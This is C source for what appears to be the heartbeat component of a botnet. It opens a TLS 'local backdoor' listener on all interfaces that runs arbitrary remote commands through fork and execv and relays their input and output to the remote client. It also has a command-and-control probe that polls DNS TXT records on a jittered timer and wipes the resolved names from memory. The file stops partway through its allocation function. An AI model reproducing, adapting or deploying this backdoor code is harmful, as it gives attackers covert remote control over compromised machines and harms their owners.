#include "htbt.h"
#include "util_rt.h"
#include "protocol.h"
#include "llist.h"
#include "pth.h"
#include "endian.h"
#include "mbedtls.h"
#include "iobuf.h"

#include <string.h>
#include <errno.h>

#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

// CNCP interval: HTBT_CNCP_INT_MIN + variance
// #define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
// #define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
// TODO
#define HTBT_CNCP_INT_MIN	59000
#define HTBT_CNCP_INT_VAR	2000
#define HTBT_LBD_PORT		prne_htobe16(PRNE_HTBT_PROTO_PORT)
#define HTBT_LBD_BACKLOG	4
// LBD Socket Operation Timeout
static const struct timespec HTBT_LBD_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
// LBD Socket Bind Retry Interval
static const struct timespec HTBT_LBD_BIND_INT = { 5, 0 }; // 5s
// LBD TLS Close Timeout
static const struct timespec HTBT_LBD_CLOSE_TIMEOUT = { 3, 0 }; // 3s


typedef struct {
	pth_t pth;
	prne_htbt_t *parent;
	prne_iobuf_t iobuf[2];
	int fd;
	bool valid;
	mbedtls_ssl_context ssl;
} htbt_lbd_client_t;

typedef struct {
	pth_mutex_t lock;
	pth_cond_t cond;
	prne_htbt_op_t op;
	void *req_body; // NULL if abandoned
	prne_htbt_status_t rsp;
} htbt_req_slip_t;

struct prne_htbt {
	prne_htbt_param_t param;
	pth_mutex_t lock;
	pth_cond_t cond;
	bool loop_flag;
	struct { // Main
		prne_llist_t req_q;
	} main;
	struct { // CNC DNS Record Probe
		pth_t pth;
		pth_mutex_t lock;
		pth_cond_t cond;
	} cncp;
	struct { // Local Backdoor
		pth_t pth;
		int fd;
		prne_llist_t conn_list;
	} lbd;
};

#define HTBT_INTP_CTX(x) prne_htbt_t *ctx = (prne_htbt_t*)(x);

static void fin_htbt_wkr (void *p) {
	HTBT_INTP_CTX(p);

	ctx->loop_flag = false;
	prne_pth_cv_notify(&ctx->lock, &ctx->cond, true);
	prne_pth_cv_notify(&ctx->cncp.lock, &ctx->cncp.cond, false);
}

static void free_htbt_wkr_ctx (void *p) {
	HTBT_INTP_CTX(p);

	// TODO

	prne_free_llist(&ctx->main.req_q);
	pth_abort(ctx->cncp.pth);

	pth_abort(ctx->lbd.pth);
	prne_close(ctx->lbd.fd);
	prne_free_llist(&ctx->lbd.conn_list);

	prne_free(p);
}

static void *htbt_main_entry (void *p) {
	HTBT_INTP_CTX(p);

	prne_assert(pth_resume(ctx->lbd.pth));
	prne_assert(pth_resume(ctx->cncp.pth));

	// TODO
	while (ctx->loop_flag) {
		pth_mutex_acquire(&ctx->lock, FALSE, NULL);
		pth_cond_await(&ctx->cond, &ctx->lock, NULL);
		pth_mutex_release(&ctx->lock);
	}

	prne_close(ctx->lbd.fd);
	ctx->lbd.fd = -1;

	prne_assert(pth_join(ctx->lbd.pth, NULL));
	prne_assert(pth_join(ctx->cncp.pth, NULL));
	ctx->lbd.pth = NULL;
	ctx->cncp.pth = NULL;

	return NULL;
}

static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
	prne_resolv_prm_t prm;
	bool r_ret;
	prne_pth_cv_t cv;
	char txtrec[256];

	prne_resolv_init_prm(&prm);
	cv.lock = &ctx->cncp.lock;
	cv.cond = &ctx->cncp.cond;
	cv.broadcast = false;

	if (!ctx->param.cb_f.cnc_txtrec(txtrec)) {
		goto END;
	}
	txtrec[255] = 0;
	r_ret = prne_resolv_prm_gettxtrec(
		ctx->param.resolv,
		txtrec,
		&cv,
		&prm);
	if (!r_ret) {
		goto END;
	}

	pth_mutex_acquire(cv.lock, FALSE, NULL);
	pth_cond_await(cv.cond, cv.lock, NULL);
	pth_mutex_release(cv.lock);

	if (prm.fut->qr == PRNE_RESOLV_QR_OK && prm.fut->rr_cnt > 0) {
		// Scrub off the name
		for (size_t i = 0; i < prm.fut->rr_cnt; i += 1) {
			prne_memzero(prm.fut->rr[i].name, strlen(prm.fut->rr[i].name));
		}
		// TODO
		// <entries in hex> <txt rec name suffix>
	}

END:
	prne_memzero(txtrec, sizeof(txtrec));
	prne_resolv_free_prm(&prm);
}

static void *htbt_cncp_entry (void *p) {
	HTBT_INTP_CTX(p);
	unsigned long intvar;
	pth_event_t ev = NULL;

	while (ctx->loop_flag) {
		htbt_cncp_do_probe(ctx);

		// calc interval variance
		intvar = 0; // ignore failure of mbedtls_ctr_drbg_random()
		mbedtls_ctr_drbg_random(
			ctx->param.ctr_drbg,
			(unsigned char*)&intvar,
			sizeof(intvar));
		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_VAR);
		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(prne_ms_timespec(intvar)));

		// wait
		prne_assert(ev != NULL); // fatal without timeout
		pth_mutex_acquire(&ctx->lock, FALSE, NULL);
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		if (!ctx->loop_flag) {
			break;
		}
	}

	pth_event_free(ev, FALSE);
	return NULL;
}

static bool htbt_lbd_client_handshake (htbt_lbd_client_t *ctx) {
	pth_event_t ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_LBD_SCK_OP_TIMEOUT));
	bool ret;

	ret = ev != NULL && prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_handshake,
		ctx->fd,
		ev);
	pth_event_free(ev, FALSE);

	return ret;
}

static void htbt_lbd_proc_close (htbt_lbd_client_t *ctx) {
	pth_event_t ev;

	ev = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_LBD_CLOSE_TIMEOUT));
	prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_close_notify,
		ctx->fd,
		ev);
	pth_event_free(ev, FALSE);
	prne_shutdown(ctx->fd, SHUT_RDWR);
	prne_close(ctx->fd);
	ctx->fd = -1;

	ctx->valid = false;
}

static void htbt_lbd_consume_outbuf (
	htbt_lbd_client_t *ctx,
	const size_t req_size,
	pth_event_t root_ev)
{
	struct pollfd pfd;
	int fret;

	pfd.fd = ctx->fd;
	pfd.events = POLLOUT;

	while (ctx->iobuf[1].len > 0) {
		fret = pth_poll_ev(&pfd, 1, -1, root_ev);
		if (root_ev != NULL &&
			pth_event_status(root_ev) != PTH_STATUS_PENDING)
		{
			break;
		}
		if (fret == 1 && pfd.revents & POLLOUT) {
			fret = mbedtls_ssl_write(
				&ctx->ssl,
				ctx->iobuf[1].m,
				ctx->iobuf[1].len);
			if (fret <= 0) {
				ctx->valid = false;
				break;
			}
			prne_iobuf_shift(ctx->iobuf + 1, -fret);
		}
		else {
			break;
		}

		if (ctx->iobuf[1].avail >= req_size) {
			break;
		}
	}
}

static void htbt_lbd_fab_frame (
	htbt_lbd_client_t *ctx,
	const prne_htbt_msg_head_t *mh,
	const void *body,
	prne_htbt_ser_ft ser_f,
	pth_event_t root_ev)
{
	size_t req, actual;

	req = 0;
	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
	req += actual;
	ser_f(NULL, 0, &actual, body);
	req += actual;

	prne_assert(req <= ctx->iobuf[1].size);
	htbt_lbd_consume_outbuf(ctx, req, root_ev);
	if (!ctx->valid) {
		return;
	}

	prne_htbt_ser_msg_head(
		ctx->iobuf[1].m + ctx->iobuf[1].len,
		ctx->iobuf[1].avail,
		&actual,
		mh);
	prne_iobuf_shift(ctx->iobuf + 1, actual);
	ser_f(
		ctx->iobuf[1].m + ctx->iobuf[1].len,
		ctx->iobuf[1].avail,
		&actual,
		body);
	prne_iobuf_shift(ctx->iobuf + 1, actual);
}

static void htbt_lbd_fab_status (
	htbt_lbd_client_t *ctx,
	prne_htbt_status_code_t status,
	int32_t err,
	uint16_t corr_msgid,
	pth_event_t root_ev)
{
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t s;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&s);
	mh.id = corr_msgid;
	mh.is_rsp = true;
	mh.op = PRNE_HTBT_OP_STATUS;
	s.code = status;
	s.err = err;

	htbt_lbd_fab_frame(
		ctx,
		&mh,
		&s,
		(prne_htbt_ser_ft)prne_htbt_ser_status,
		root_ev);

	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&s);
}

static void htbt_lbd_raise_protoerr (
	htbt_lbd_client_t *ctx,
	uint16_t corr_msgid,
	int32_t err,
	pth_event_t root_ev)
{
	htbt_lbd_fab_status(
		ctx,
		PRNE_HTBT_STATUS_PROTO_ERR,
		err,
		corr_msgid,
		root_ev);
	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
	ctx->valid = false;
}

static void htbt_lbd_fab_unimpl (
	htbt_lbd_client_t *ctx,
	uint16_t corr_msgid,
	pth_event_t root_ev)
{
	htbt_lbd_fab_status(
		ctx,
		PRNE_HTBT_STATUS_UNIMPL,
		0,
		corr_msgid,
		root_ev);
}

static void htbt_lbd_srv_hostinfo (
	htbt_lbd_client_t *ctx,
	pth_event_t root_ev,
	const prne_htbt_msg_head_t *mh)
{
	prne_htbt_host_info_t hi;

	if (ctx->parent->param.cb_f.hostinfo == NULL) {
		htbt_lbd_fab_unimpl(ctx, mh->id, root_ev);
		return;
	}

	prne_htbt_init_host_info(&hi);

	if (ctx->parent->param.cb_f.hostinfo(&hi)) {
		htbt_lbd_fab_frame(
			ctx,
			mh,
			&hi,
			(prne_htbt_ser_ft)prne_htbt_ser_host_info,
			root_ev);
	}
	else {
		htbt_lbd_fab_status(
			ctx,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			mh->id,
			root_ev);
	}

	prne_htbt_free_host_info(&hi);
}

static bool htbt_relay_child (
	const int conn,
	mbedtls_ssl_context *ssl,
	prne_iobuf_t *iobuf,
	int *c_in,
	int *c_out,
	int *c_err)
{
	bool ret = true;
	struct pollfd pfd[4];
	prne_htbt_stdio_t head[2];
	int f_ret, pending, out_p = 0;
	size_t actual;

	pfd[0].fd = conn;
	pfd[1].fd = *c_in;
	pfd[2].fd = *c_out;
	pfd[3].fd = *c_err;
	prne_htbt_init_stdio(head + 0);
	prne_htbt_init_stdio(head + 1);

	while ((!head[0].fin && head[0].len > 0) ||
		iobuf[1].len > 0 ||
		pfd[1].fd >= 0 ||
		pfd[2].fd >= 0 ||
		pfd[3].fd >= 0)
	{
		pfd[0].events = 0;
		if (iobuf[1].len > 0) {
			pfd[0].events |= POLLOUT;
		}
		if (iobuf[0].avail > 0 && !(head[0].fin && head[0].len == 0)) {
			pfd[0].events |= POLLIN;
		}

		if (head[0].len > 0 && iobuf[0].len > 0) {
			pfd[1].events = POLLOUT;
		}
		else {
			pfd[1].events = 0;
		}

		pfd[2].events = 0;
		pfd[3].events = 0;
		if (iobuf[1].len == 0) {
			if (pfd[2 + out_p].fd < 0) {
				out_p = (out_p + 1) % 2;
			}
			pfd[2 + out_p].events |= POLLIN;
		}

		f_ret = pth_poll(pfd, 4, -1);
		if (f_ret < 0 && errno != EINTR) {
			ret = false;
			break;
		}
		if (f_ret == 0) {
			break;
		}

		if (pfd[0].revents & POLLIN) {
			f_ret = mbedtls_ssl_read(
				ssl,
				iobuf[0].m + iobuf[0].len,
				iobuf[0].avail);
			if (f_ret <= 0) {
				break;
			}
			else {
				prne_iobuf_shift(iobuf + 0, f_ret);
				if (head[0].len == 0) {
					if (prne_htbt_dser_stdio(
						iobuf[0].m,
						iobuf[0].len,
						&actual,
						head + 0) == PRNE_HTBT_SER_RC_OK)
					{
						prne_iobuf_shift(iobuf + 0, -actual);
						if (head[0].len == 0 && head[0].fin) {
							close(*c_in);
							*c_in = -1;
						}
					}
				}
			}
		}
		if (pfd[0].revents & POLLOUT) {
			f_ret = mbedtls_ssl_write(
				ssl,
				iobuf[1].m,
				iobuf[1].len);
			if (f_ret <= 0) {
				break;
			}
			else {
				prne_iobuf_shift(iobuf + 1, -f_ret);
				if (pending > 0) {
					pending -= f_ret;
				}
				else {
					head[1].len -= f_ret;
					if (head[1].len == 0) {
						out_p = (out_p + 1) % 2;
					}
				}
			}
		}
		if (pfd[0].revents & (POLLNVAL | POLLHUP | POLLERR)) {
			pfd[0].fd = -1;
		}

		if (pfd[1].fd < 0 && head[0].len > 0) {
			const ssize_t consume = prne_op_min(iobuf[0].len, head[0].len);

			prne_iobuf_shift(iobuf + 0, -consume);
			head[0].len -= consume;
		}
		else if (pfd[1].revents) {
			const ssize_t consume = prne_op_min(iobuf[0].len, head[0].len);

			f_ret = write(*c_in, iobuf[0].m, consume);
			if (f_ret <= 0) {
				pfd[1].fd = -1;
			}

			prne_iobuf_shift(iobuf + 0, -consume);
			head[0].len -= consume;
			if (head[0].len == 0 && head[0].fin) {
				close(*c_in);
				*c_in = -1;
				pfd[0].fd = -1;
			}
		}

		if (pfd[2 + out_p].revents) {
			if (head[1].len == 0) {
				prne_assert(ioctl(pfd[2 + out_p].fd, FIONREAD, &pending) == 0);

				head[1].len = (size_t)prne_op_min(
					pending,
					PRNE_HTBT_STDIO_LEN_MAX);
				head[1].err = out_p != 0;
				head[1].fin = head[1].len == 0;
				prne_htbt_ser_stdio(
					iobuf[1].m + iobuf[1].len,
					iobuf[1].avail,
					&actual,
					head + 1);
				pending = (size_t)actual;
				prne_iobuf_shift(iobuf + 1, actual);

				if (head[1].fin) {
					pfd[2 + out_p].fd = -1;
				}
			}
			else {
				f_ret = read(
					pfd[2 + out_p].fd,
					iobuf[1].m + iobuf[1].len,
					prne_op_min(head[1].len, iobuf[1].avail));
				prne_dbgast(f_ret > 0);
				prne_iobuf_shift(iobuf + 1, f_ret);
			}
		}
	}

	prne_htbt_free_stdio(head + 0);
	prne_htbt_free_stdio(head + 1);
	close(*c_in);
	close(*c_out);
	close(*c_err);
	*c_in = -1;
	*c_out = -1;
	*c_err = -1;

	return ret;
}

/* htbt_do_cmd()
*
* Give flushed output buffer.
*/
static void htbt_do_cmd (
	const bool detach,
	char *const *args,
	const int conn,
	mbedtls_ssl_context *ssl,
	prne_iobuf_t *iobuf,
	prne_htbt_status_code_t *out_status,
	int32_t *out_err)
{
	int cin[2] = { -1, -1 };
	int cout[2] = { -1, -1 };
	int cerr[2] = { -1, -1 };
	int errp[2] = { -1, -1 };
	pid_t child = -1;
	int f_ret;

	if (pipe(errp) != 0 ||
		fcntl(errp[0], F_SETFD, FD_CLOEXEC) != 0 ||
		fcntl(errp[1], F_SETFD, FD_CLOEXEC) != 0)
	{
		*out_status = PRNE_HTBT_STATUS_ERRNO;
		*out_err = errno;
		goto END;
	}
	if (!detach &&
		(pipe(cin) != 0 || pipe(cout) != 0 || pipe(cerr) != 0))
	{
		*out_status = PRNE_HTBT_STATUS_ERRNO;
		*out_err = errno;
		goto END;
	}

	child = pth_fork();
	if (child == 0) {
		do { // TRY
			close(errp[0]);

			if (detach) {
				if (setsid() < 0) {
					break;
				}
				close(STDIN_FILENO);
				// Inherit these if DEBUG
#if !defined(PRNE_DEBUG)
				close(STDOUT_FILENO);
				close(STDERR_FILENO);
#endif
			}
			else {
				close(cin[1]);
				close(cout[0]);
				close(cerr[0]);
				if (prne_chfd(cin[0], STDIN_FILENO) != STDIN_FILENO ||
					prne_chfd(cout[1], STDOUT_FILENO) != STDOUT_FILENO ||
					prne_chfd(cerr[1], STDERR_FILENO) != STDERR_FILENO)
				{
					break;
				}
			}

			execv(args[0], args);
		} while (false);
		// CATCH
		*out_err = errno;
		write(errp[1], out_err, sizeof(int32_t));
		raise(SIGKILL);
	}
	else if (child < 0) {
		*out_status = PRNE_HTBT_STATUS_ERRNO;
		*out_err = errno;
		goto END;
	}

	// The parent continues ...
	close(errp[1]);

	// This could block forever if the child gets stoppep
	f_ret = pth_read(errp[0], out_err, sizeof(int32_t));
	if (f_ret == sizeof(int32_t)) {
		*out_status = PRNE_HTBT_STATUS_ERRNO;
		goto END;
	}
	prne_close(errp[0]);
	errp[0] = -1;

	*out_status = PRNE_HTBT_STATUS_OK;
	if (detach) {
		*out_err = 0;
		child = -1;
	}
	else {
		int status;

		prne_close(cin[0]);
		prne_close(cout[1]);
		prne_close(cerr[1]);
		cin[0] = cout[1] = cerr[1] = errp[1] = -1;
		if (!prne_sck_fcntl(cin[1]) ||
			!prne_sck_fcntl(cout[0]) ||
			!prne_sck_fcntl(cerr[0]))
		{
			*out_status = PRNE_HTBT_STATUS_ERRNO;
			*out_err = errno;
			goto END;
		}

		if (htbt_relay_child(conn, ssl, iobuf, &cin[1], &cout[0], &cerr[0])) {
			if (pth_waitpid(child, &status, WUNTRACED) < 0) {
				*out_status = PRNE_HTBT_STATUS_ERRNO;
				*out_err = errno;
				goto END;
			}
			else if (WIFEXITED(status)) {
				*out_err = WEXITSTATUS(status);
			}
			else if (WIFSIGNALED(status)) {
				*out_err = 128 + WTERMSIG(status);
			}
			else {
				// child has been stopped just right before exit
				*out_err = -1;
			}
			child = -1;
		}
		else {
			*out_status = PRNE_HTBT_STATUS_ERRNO;
			*out_err = errno;
		}
	}

END:
	prne_close(cin[0]);
	prne_close(cin[1]);
	prne_close(cout[0]);
	prne_close(cout[1]);
	prne_close(cerr[0]);
	prne_close(cerr[1]);
	prne_close(errp[0]);
	prne_close(errp[1]);
	if (child > 0) {
		kill(child, SIGKILL);
		pth_waitpid(child, NULL, 0);
	}
}

static bool htbt_lbd_srv_run_cmd (
	htbt_lbd_client_t *ctx,
	pth_event_t root_ev,
	const size_t off,
	const prne_htbt_msg_head_t *mh)
{
	bool ret = false;
	size_t actual;
	prne_htbt_ser_rc_t s_ret;
	prne_htbt_cmd_t cmd;
	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_ERRNO;
	int32_t err = 0;

	prne_htbt_init_cmd(&cmd);

	s_ret = prne_htbt_dser_cmd(
		ctx->iobuf[0].m + off,
		ctx->iobuf[0].len - off,
		&actual,
		&cmd);
	if (s_ret != PRNE_HTBT_SER_RC_MORE_BUF) {
		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
	}
	if (s_ret == PRNE_HTBT_SER_RC_FMT_ERR) {
		htbt_lbd_raise_protoerr(ctx, mh->id, 0, root_ev);
		goto END;
	}
	if (s_ret != PRNE_HTBT_SER_RC_OK) {
		htbt_lbd_fab_status(
			ctx,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			mh->id,
			root_ev);
		goto END;
	}

	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
	if (root_ev != NULL && pth_event_status(root_ev) == PTH_STATUS_PENDING) {
		htbt_do_cmd(
			cmd.detach,
			cmd.args,
			ctx->fd,
			&ctx->ssl,
			ctx->iobuf,
			&status,
			&err);
		htbt_lbd_fab_status(ctx, status, err, mh->id, root_ev);
		ret = true;
	}
END:
	prne_htbt_free_cmd(&cmd);
	return ret;
}

static bool htbt_lbd_consume_inbuf (
	htbt_lbd_client_t *ctx,
	pth_event_t root_ev)
{
	prne_htbt_ser_rc_t s_ret;
	prne_htbt_msg_head_t f_head;
	size_t actual;
	bool ret = true;

	prne_htbt_init_msg_head(&f_head);

	s_ret = prne_htbt_dser_msg_head(
		ctx->iobuf[0].m,
		ctx->iobuf[0].len,
		&actual,
		&f_head);
	if (s_ret != PRNE_HTBT_SER_RC_OK) {
		ret = false;
		goto END;
	}
	if (f_head.is_rsp ||
		(f_head.op != PRNE_HTBT_OP_NOOP && f_head.id == 0))
	{
		htbt_lbd_raise_protoerr(ctx, f_head.id, 0, root_ev);
		ret = false;
		goto END;
	}

	f_head.is_rsp = true;
	switch (f_head.op) {
	case PRNE_HTBT_OP_NOOP:
		prne_iobuf_shift(ctx->iobuf + 0, -actual);
		break;
	case PRNE_HTBT_OP_HOST_INFO:
		htbt_lbd_srv_hostinfo(ctx, root_ev, &f_head);
		break;
	case PRNE_HTBT_OP_RUN_CMD:
		ret = htbt_lbd_srv_run_cmd(ctx, root_ev, actual, &f_head);
		break;
	case PRNE_HTBT_OP_RUN_BIN:
	case PRNE_HTBT_OP_HOVER:
	case PRNE_HTBT_OP_NY_BIN:
	default:
		htbt_lbd_raise_protoerr(
			ctx,
			f_head.id,
			PRNE_HTBT_STATUS_UNIMPL,
			root_ev);
		ret = false;
		break;
	}

END:
	prne_htbt_free_msg_head(&f_head);

	return ret;
}

static void *htbt_lbd_client_entry (void *p) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)p;
	int rw_size;
	pth_event_t ev = NULL, ev_timeout = NULL;
	struct pollfd pfd;
	unsigned long ev_spec;

	if (!htbt_lbd_client_handshake(ctx)) {
		ctx->valid = false;
	}

	while (ctx->parent->loop_flag && ctx->valid) {
		if (ctx->iobuf[1].len > 0) {
			ev_spec =
				PTH_EVENT_FD |
				PTH_UNTIL_FD_READABLE |
				PTH_UNTIL_FD_WRITEABLE |
				PTH_UNTIL_FD_EXCEPTION;
			pfd.events = POLLIN | POLLOUT;
		}
		else {
			ev_spec =
				PTH_EVENT_FD |
				PTH_UNTIL_FD_READABLE |
				PTH_UNTIL_FD_EXCEPTION;
			pfd.events = POLLIN;
		}

		if (ev_timeout == NULL) {
			ev_timeout = pth_event(
				PTH_EVENT_TIME,
				prne_pth_tstimeout(HTBT_LBD_SCK_OP_TIMEOUT));
			prne_assert(ev_timeout != NULL);
		}
		pth_event_free(ev, FALSE);
		ev = pth_event(
			ev_spec,
			ctx->fd);
		prne_assert(ev != NULL);
		pth_event_concat(ev, ev_timeout, NULL);

		prne_assert(pth_mutex_acquire(&ctx->parent->lock, FALSE, ev));
		pth_cond_await(&ctx->parent->cond, &ctx->parent->lock, ev);
		pth_mutex_release(&ctx->parent->lock);
		if (!ctx->parent->loop_flag) {
			break;
		}

		pfd.fd = ctx->fd;
		if (poll(&pfd, 1, 0) == 1) {
			if (!(pfd.revents & (POLLIN | POLLOUT))) {
				break;
			}

			if (pfd.revents & POLLOUT) {
				htbt_lbd_consume_outbuf(ctx, 0, ev_timeout);
			}
			if (pfd.revents & POLLIN) {
				if (ctx->iobuf[0].avail == 0) {
					prne_dbgpf("** Malicious client?\n");
					goto END;
				}
				rw_size = mbedtls_ssl_read(
					&ctx->ssl,
					ctx->iobuf[0].m + ctx->iobuf[0].len,
					ctx->iobuf[0].avail);
				if (rw_size <= 0) {
					break;
				}
				prne_iobuf_shift(ctx->iobuf + 0, rw_size);

				if (htbt_lbd_consume_inbuf(ctx, ev_timeout)) {
					pth_event_free(ev_timeout, FALSE);
					ev_timeout = NULL;
				}
			}
		}
	}

END:
	pth_event_free(ev, TRUE);
	htbt_lbd_proc_close(ctx);

	return NULL;
}

static void htbt_init_lbd_client (htbt_lbd_client_t *c) {
	c->pth = NULL;
	c->parent = NULL;
	prne_init_iobuf(c->iobuf + 0);
	prne_init_iobuf(c->iobuf + 1);
	c->fd = -1;
	c->valid = true;
	mbedtls_ssl_init(&c->ssl);
}

static void htbt_free_lbd_client (htbt_lbd_client_t *c) {
	if (c == NULL) {
		return;
	}
	pth_abort(c->pth);
	prne_free_iobuf(c->iobuf + 0);
	prne_free_iobuf(c->iobuf + 1);
	prne_close(c->fd);
	c->fd = -1;
	mbedtls_ssl_free(&c->ssl);
	prne_free(c);
}

static void htbt_lbd_setup_loop (prne_htbt_t *ctx) {
	uint8_t m_sckaddr[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	int optval;
	socklen_t sl;
	pth_event_t ev;

	while (ctx->loop_flag) {
		prne_memzero(m_sckaddr, sizeof(m_sckaddr));
		if ((ctx->lbd.fd = socket(AF_INET6, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in6* sa = (struct sockaddr_in6*)m_sckaddr;

			sa->sin6_addr = in6addr_any;
			sa->sin6_family = AF_INET6;
			sa->sin6_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in6);
		}
		else if ((ctx->lbd.fd = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in* sa = (struct sockaddr_in*)m_sckaddr;

			sa->sin_addr.s_addr = INADDR_ANY;
			sa->sin_family = AF_INET;
			sa->sin_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in);
		}
		else {
			goto ERR;
		}
		if (!prne_sck_fcntl(ctx->lbd.fd)) {
			goto ERR;
		}
		optval = 1;
		setsockopt(
			ctx->lbd.fd,
			SOL_SOCKET,
			SO_REUSEADDR,
			&optval,
			sizeof(optval));
		if (bind(ctx->lbd.fd, (struct sockaddr*)m_sckaddr, sl) != 0) {
			goto ERR;
		}
		if (listen(ctx->lbd.fd, HTBT_LBD_BACKLOG) != 0) {
			goto ERR;
		}

		break;
ERR:
		prne_close(ctx->lbd.fd);
		ctx->lbd.fd = -1;

		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_LBD_BIND_INT));
		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		pth_event_free(ev, FALSE);
	}
}

static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
	int fret;
	pth_event_t ev = NULL;
	prne_llist_entry_t *ent;
	htbt_lbd_client_t *client;
	pth_attr_t attr;
	pth_state_t ths;
	struct pollfd pfd;
	const size_t PAGESIZE = prne_getpagesize();

	while (ctx->loop_flag) {
		if (ev == NULL) {
			ev = pth_event(
				PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
				ctx->lbd.fd);
			prne_assert(ev != NULL);

			ent = ctx->lbd.conn_list.head;
			while (ent != NULL) {
				pth_event_t ev_sub = pth_event(
					PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
					((htbt_lbd_client_t*)ent->element)->pth);
				prne_assert(ev_sub != NULL);
				pth_event_concat(ev, ev_sub, NULL);

				ent = ent->next;
			}
		}

		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		if (!ctx->loop_flag) {
			break;
		}

		ent = ctx->lbd.conn_list.head;
		while (ent != NULL) {
			client = (htbt_lbd_client_t*)ent->element;

			attr = pth_attr_of(client->pth);
			prne_assert(pth_attr_get(attr, PTH_ATTR_STATE, &ths));
			pth_attr_destroy(attr);

			if (ths == PTH_STATE_DEAD) {
				pth_join(client->pth, NULL);
				client->pth = NULL;
				htbt_free_lbd_client(client);
				ent = prne_llist_erase(&ctx->lbd.conn_list, ent);

				pth_event_free(ev, TRUE);
				ev = NULL;
			}
			else {
				ent = ent->next;
			}
		}

		pfd.fd = ctx->lbd.fd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 0) == 1) {
			if (!(pfd.revents & POLLIN)) {
				break;
			}

			fret = accept(ctx->lbd.fd, NULL, NULL);
			if (fret >= 0) {
				pth_event_free(ev, TRUE);
				ev = NULL;
				client = NULL;
				ent = NULL;
				do { // TRY
					const size_t IOBUF_SIZE[2][2] = {
						// TODO: switch after testing
						{
							PRNE_HTBT_PROTO_MIN_BUF,
							PRNE_HTBT_PROTO_SUB_MIN_BUF },
						{ PAGESIZE, PAGESIZE }
					};
					bool alloc;

					client = (htbt_lbd_client_t*)prne_malloc(
						sizeof(htbt_lbd_client_t),
						1);
					if (client == NULL) {
						goto CATCH;
					}
					htbt_init_lbd_client(client);

					for (size_t i = 0; i < 2; i += 1) {
						alloc =
							prne_alloc_iobuf(
								client->iobuf + 0,
								IOBUF_SIZE[i][0]) &&
							prne_alloc_iobuf(
								client->iobuf + 1,
								IOBUF_SIZE[i][1]);
						if (alloc) {
							break;
						}
					}
					if (!alloc) {
						goto CATCH;
					}

					client->parent = ctx;
					client->fd = fret;
					if (mbedtls_ssl_setup(
						&client->ssl,
						ctx->param.lbd_ssl_conf) != 0)
					{
						goto CATCH;
					}
					mbedtls_ssl_set_bio(
						&client->ssl,
						&client->fd,
						prne_mbedtls_ssl_send_cb,
						prne_mbedtls_ssl_recv_cb,
						NULL);

					ent = prne_llist_append(&ctx->lbd.conn_list, client);
					if (ent == NULL) {
						goto CATCH;
					}

					client->pth = pth_spawn(
						PTH_ATTR_DEFAULT,
						htbt_lbd_client_entry,
						client);
					if (client->pth == NULL) {
						goto CATCH;
					}

					pth_event_free(ev, TRUE);
					ev = NULL;

					break;
CATCH:				// CATCH
					if (ent != NULL) {
						prne_llist_erase(&ctx->lbd.conn_list, ent);
						ent = NULL;
					}
					if (client != NULL) {
						htbt_free_lbd_client(client);
					}
					prne_close(fret);
				} while (false);
			}
		}
	}

	pth_event_free(ev, TRUE);

	ent = ctx->lbd.conn_list.head;
	while (ent != NULL) {
		client = (htbt_lbd_client_t*)ent->element;
		ent = ent->next;

		pth_join(client->pth, NULL);
		prne_free(client);
	}
	prne_llist_clear(&ctx->lbd.conn_list);
}

static void *htbt_lbd_entry (void *p) {
	HTBT_INTP_CTX(p);

	htbt_lbd_setup_loop(ctx);
	htbt_lbd_serve_loop(ctx);

	return NULL;
}

prne_htbt_t *prne_alloc_htbt (
	prne_worker_t *w,
	const prne_htbt_param_t param)
{
	prne_htbt_t *ret = NULL;

	if (w == NULL ||
		param.cb_f.cnc_txtrec == NULL ||
		param.lbd_ssl_conf == NULL ||
		param.cncp_ssl_conf == NULL ||
		param.ctr_drbg == NULL ||
		param.resolv == NULL)
	{
		errno = EINVAL;
		goto ERR;
	}

	ret = prne_calloc(sizeof(prne_htbt_t), 1);
	if (ret == NULL) {
		goto ERR;
	}

	ret->param = param;
	prne_init_llist(&ret->main.req_q);
	ret->loop_flag = true;
	pth_mutex_init(&ret->lock);
	pth_cond_init(&ret->cond);

	ret->cncp.pth = NULL;

	ret->lbd.pth = NULL;
